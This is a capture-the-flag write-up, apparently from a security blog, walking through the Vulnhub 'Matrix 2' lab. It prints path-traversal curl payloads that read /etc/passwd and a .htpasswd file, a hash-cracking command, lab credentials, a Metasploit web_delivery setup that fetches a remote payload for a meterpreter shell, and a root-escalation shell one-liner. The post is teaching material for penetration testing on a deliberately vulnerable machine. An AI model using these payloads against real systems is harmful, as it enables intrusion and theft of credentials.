@@ -1,0 +1,348 @@
+
+								
+																		Matrix 2: Vulnhub Lab Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 1, 2019
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another Boot2Root challenge “Matrix 2”. It is another vulnerable lab presented by vulnhub for helping pentester’s to perform penetration testing according to their experience level. This vulnerable lab can be downloaded from here.
+
+Difficulty: Intermediate
+Penetrating Methodologies:
+
+Network scanning (Nmap)
+Surfing HTTP service port (80)
+Surfing HTTPS service port (1337)
+Surfing HTTPS service port (12320)
+Surfing HTTPS service port (12322)
+Browsing Directories on the browser
+Discovering LFI vulnerability.
+Enumerating through /etc/passwd file.
+Enumerating through /var/www/p4ss/.htapasswd file.
+Cracking password hash.
+Using Credentials to log into port 1337.
+Viewing Page source of Webpage.
+Find Hidden file using steghide.
+Using Credentials to log into port 12320.
+Creating Python exploit using Metasploit.
+Getting root access.
+Snagging the Root flag.
+
+Walkthrough
+Let’s start off with scanning the network to find our target.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.101
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.101
+					
+				
+			
+		
+
+
+From nmap result, we observed that on multiple ports there is HTTPS service running except on port 80. We thought of exploring all the ports along with targets IP Address on the browser. Let’s see what clue we get to move ahead.
+Firstly, we explored the Targets IP address on port 80 on the browser. It was not much of great help.
+
+Secondly, we explored the Targets IP Address on port 1337 on the browser. Here we noticed it required authentication but we don’t know that. Moving on.
+
+Thirdly, we explored the Targets IP Address over port 12320 on the browser. We noticed that it showed us a command shell which again is not much of great help. Moving Forward.
+
+Fourthly, we explored the Targets IP Address over port 12322 on the browser. The webpage opened didn’t come out to be much useful. But what draws our attention is that we noticed two disallowed entry on port 12322 in the nmap scan result. On exploring the first entry robots.txt, we found another disallowed entry i.e file_view.php.
+
+When we explored the entry file_view.php along with Targets IP Address, it opened a blank webpage which made us curious about it. So, when we checked the View Page Source, there we saw the page is sending a GET Request. After spending some time thinking, we decided to use curl for exploiting LFI vulnerability for obtaining /etc/passwd file. Here we saw two credentials n30 and Neo, they might come in handy.
+
+		
+		
+			
+			
+			
+			
+curl -X POST –k https://192.168.1.101:12322/file_view.php -d "file=../../../../../etc/passwd"
+			
+				
+					
+				
+					1
+				
+						curl -X POST –k https://192.168.1.101:12322/file_view.php -d "file=../../../../../etc/passwd"
+					
+				
+			
+		
+
+
+Here, we found another directory /var/www/p4ss/.htpasswd which might be useful.
+
+		
+		
+			
+			
+			
+			
+curl -X POST -k https://192.168.1.101:12322/file_view.php -d "file=../../../../../etc/nginx/sites-available/default"
+			
+				
+					
+				
+					1
+				
+						curl -X POST -k https://192.168.1.101:12322/file_view.php -d "file=../../../../../etc/nginx/sites-available/default"
+					
+				
+			
+		
+
+
+After getting another directory, We used curl to exploit LFI vulnerability to obtain the contents of /var/www/p4ss/.htapasswd by using the command.
+
+		
+		
+			
+			
+			
+			
+curl –X POST –k https://192.168.1.101:12322/file_view.php -d "file=../../../../../var/www/p4ss/.htapasswd"
+			
+				
+					
+				
+					1
+				
+						curl –X POST –k https://192.168.1.101:12322/file_view.php -d "file=../../../../../var/www/p4ss/.htapasswd"
+					
+				
+			
+		
+
+This result gave us a HASH. Time to bring john up.
+
+We have used John to crack the hash.
+
+		
+		
+			
+			
+			
+			
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+			
+				
+					
+				
+					1
+				
+						john hash --wordlist=/usr/share/wordlists/rockyou.txt
+					
+				
+			
+		
+
+It gave us a Username and Password i.e admin &amp; Tr1n17y
+
+Let’s use these credentials to log into port 1337 along with Targets IP Address on the browser.
+
+The webpage showed a name n30 which can be used as a credential later on. On exploring the View Page Source of the webpage showed us a hidden image h1dd3n.jpg.
+
+When opening the image h1dd3n.jpg on the browser. The result is shown in the image below.
+
+We have used a tool called “steghide” to find if there is any file hidden inside the image and find a hidden text file called “n30.txt”. We extract the file and opened it which gave us a password i.e P4$$w0rd.
+
+Let’s login to port 12320 using targets IP Address by using Credentials as.
+
+		
+		
+			
+			
+			
+			
+Username: n30
+Password: P4$$w0rd
+			
+				
+					
+				
+					12
+				
+						Username: n30Password: P4$$w0rd
+					
+				
+			
+		
+
+
+After making sure python is running on the machine. We have created a python exploit using Metasploit.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/script/web_delivery
+set lhost 192.168.1.107
+set srvhost 192.168.1.107
+exploit
+			
+				
+					
+				
+					1234
+				
+						use exploit/multi/script/web_deliveryset lhost 192.168.1.107set srvhost 192.168.1.107exploit
+					
+				
+			
+		
+
+Let’s copy the command created and paste it on the target machine.
+
+Let’s copy the command created and paste it on the target machine.
+
+After obtaining meterpreter, we have explored the directories. Here we found a file .bash_history which contains some commands. These commands can be useful to get root access, let’s save them for later use.
+
+		
+		
+			
+			
+			
+			
+ls
+cat .bash_histroy
+			
+				
+					
+				
+					12
+				
+						lscat .bash_histroy
+					
+				
+			
+		
+
+
+Let’s get back to the meterpreter and use the command we have obtained earlier.
+Booyah!! We have got the root access. Time to read the flag.
+
+		
+		
+			
+			
+			
+			
+shell
+id
+morpheus 'BEGIN {system("/bin/sh")}'
+id
+cd /root
+ls
+cat flag.txt
+			
+				
+					
+				
+					1234567
+				
+						shellidmorpheus 'BEGIN {system("/bin/sh")}'idcd /rootlscat flag.txt
+					
+				
+			
+		
+
+
+Author: Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 2 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
